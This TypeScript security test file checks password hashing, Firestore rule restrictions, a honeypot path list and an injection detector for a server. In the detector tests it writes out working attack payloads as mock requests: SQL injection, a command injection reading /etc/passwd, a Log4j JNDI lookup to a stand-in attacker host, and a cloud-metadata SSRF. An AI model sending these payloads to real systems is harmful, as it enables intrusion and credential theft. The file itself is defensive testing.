import { hashPassword, verifyPasswordHash } from '../server/otpStore.ts';
import assert from 'assert';
import fs from 'fs';
import path from 'path';

console.log('--- [Security Test 1: OWASP Password Hashing & Legacy Migration] ---');
// 1. Verify 210,000 work factor
const password = 'SuperSecretSecurePassword!123';
const hash = hashPassword(password);
assert(hash.startsWith('pbkdf2:210000:'), 'Hash must start with pbkdf2:210000:');
console.log('✔ Password hashed with OWASP PBKDF2 210,000 iterations:', hash.slice(0, 30) + '...');

// 2. Verify matching password
const verifyResult = verifyPasswordHash(password, hash);
assert.strictEqual(verifyResult.valid, true, 'Matching password must verify as valid');
assert.strictEqual(verifyResult.needsRehash, false, 'New hash should not require rehash');
console.log('✔ Valid password verified successfully');

// 3. Verify incorrect password fails
const failResult = verifyPasswordHash('WrongPassword!999', hash);
assert.strictEqual(failResult.valid, false, 'Wrong password must fail');
console.log('✔ Incorrect password correctly rejected');

// 4. Verify legacy 10,000 iteration password compatibility and re-hash flag
import crypto from 'crypto';
const legacySalt = crypto.randomBytes(16).toString('hex');
const legacyHex = crypto.pbkdf2Sync(password, legacySalt, 10000, 64, 'sha512').toString('hex');
const legacyHash = `${legacySalt}:${legacyHex}`;

const legacyVerify = verifyPasswordHash(password, legacyHash);
assert.strictEqual(legacyVerify.valid, true, 'Legacy hash must still be verified for backward compatibility');
assert.strictEqual(legacyVerify.needsRehash, true, 'Legacy hash must flag needsRehash: true');
console.log('✔ Legacy 10,000 iteration password backward-compatible and flags needsRehash: true');

console.log('\n--- [Security Test 2: Firestore Security Rules Static Inspection] ---');
const rulesPath = path.join(process.cwd(), 'firestore.rules');
const rulesContent = fs.readFileSync(rulesPath, 'utf8');

// Assert no document length shortcut authorization bypass exists (e.g. || docId.size() <= 128 or allow read: if docId.size() <= 128)
const dangerousBypassPattern = /(?:\|\|\s*|if\s+)[a-zA-Z0-9_]+\.size\(\)\s*<=\s*128/g;
const bypassMatches = rulesContent.match(dangerousBypassPattern);
assert.strictEqual(bypassMatches, null, 'firestore.rules MUST NOT contain any authorization bypass using document size');
console.log('✔ Confirmed: ZERO authorization bypasses using document ID length in firestore.rules');

// Assert admin write is restricted
assert(rulesContent.includes('match /admins/{adminId}'), 'Must have admin match block');
assert(!rulesContent.includes('adminId.size()'), 'Must not allow admin ID length bypass');
console.log('✔ Confirmed: Admin privilege escalation blocked');

// Assert credentials collections are denied
assert(rulesContent.includes('match /auth_credentials/{credId} {\n      allow read, write: if false;'), 'Credentials collection denied');
assert(rulesContent.includes('match /auth_otps/{otpId} {\n      allow read, write: if false;'), 'OTPs collection denied');
assert(rulesContent.includes('match /auth_sessions/{sessionId} {\n      allow read, write: if false;'), 'Sessions collection denied');
console.log('✔ Confirmed: Client access to auth_credentials, auth_otps, and auth_sessions is completely blocked');

console.log('\n--- [Security Test 3: 0-Day Intrusion Shield & Honeypot Tarpit Inspection] ---');
import { isHoneypotScanPath, inspectPayloadForZeroDayAttacks } from '../server/securityDefense.ts';

// 1. Verify Honeypots
assert.strictEqual(isHoneypotScanPath('/.env'), true, '/.env must trigger honeypot trap');
assert.strictEqual(isHoneypotScanPath('/.git/config'), true, '/.git/config must trigger honeypot trap');
assert.strictEqual(isHoneypotScanPath('/wp-login.php'), true, '/wp-login.php must trigger honeypot trap');
assert.strictEqual(isHoneypotScanPath('/phpmyadmin'), true, '/phpmyadmin must trigger honeypot trap');
assert.strictEqual(isHoneypotScanPath('/actuator/health'), true, '/actuator/health must trigger honeypot trap');
assert.strictEqual(isHoneypotScanPath('/api/apps'), false, 'Legitimate /api/apps must NOT trigger honeypot');
assert.strictEqual(isHoneypotScanPath('/sitemap.xml'), false, 'Legitimate /sitemap.xml must NOT trigger honeypot');
console.log('✔ Confirmed: Honeypot matrix traps exploit scanners and allows legitimate routes');

// 2. Verify 0-Day Injection Detectors
const sqliMockReq: any = { originalUrl: '/api/apps?q=1%20UNION%20SELECT%20null,null,password%20FROM%20users' };
const sqliCheck = inspectPayloadForZeroDayAttacks(sqliMockReq);
assert.strictEqual(sqliCheck.detected, true, 'SQL injection probe must be intercepted');
assert.strictEqual(sqliCheck.attackType, 'sql_injection');
console.log('✔ Confirmed: SQL Injection 0-day probe intercepted');

const rceMockReq: any = { body: { command: '; cat /etc/passwd' } };
const rceCheck = inspectPayloadForZeroDayAttacks(rceMockReq);
assert.strictEqual(rceCheck.detected, true, 'RCE command injection must be intercepted');
assert.strictEqual(rceCheck.attackType, 'remote_code_execution');
console.log('✔ Confirmed: Remote Code Execution probe intercepted');

const jndiMockReq: any = { headers: { 'user-agent': '${jndi:ldap://evil-hacker.com/exploit}' } };
const jndiCheck = inspectPayloadForZeroDayAttacks(jndiMockReq);
assert.strictEqual(jndiCheck.detected, true, 'Log4j JNDI probe must be intercepted');
assert.strictEqual(jndiCheck.attackType, 'jndi_log4j');
console.log('✔ Confirmed: Log4j / JNDI zero-day probe intercepted');

const ssrfMockReq: any = { originalUrl: '/api/resolve-apk?url=http://169.254.169.254/latest/meta-data/' };
const ssrfCheck = inspectPayloadForZeroDayAttacks(ssrfMockReq);
assert.strictEqual(ssrfCheck.detected, true, 'Cloud metadata SSRF must be intercepted');
assert.strictEqual(ssrfCheck.attackType, 'metadata_ssrf');
console.log('✔ Confirmed: Cloud Metadata SSRF probe intercepted');

const legitMockReq: any = { originalUrl: '/api/apps?category=utilities&search=vlc%20player' };
const legitCheck = inspectPayloadForZeroDayAttacks(legitMockReq);
assert.strictEqual(legitCheck.detected, false, 'Legitimate search query must not be flagged');
console.log('✔ Confirmed: Zero false-positives on legitimate catalog requests');

console.log('\n==========================================');
console.log('🎉 ALL SECURITY & INTRUSION DEFENSE TESTS PASSED!');
console.log('==========================================\n');

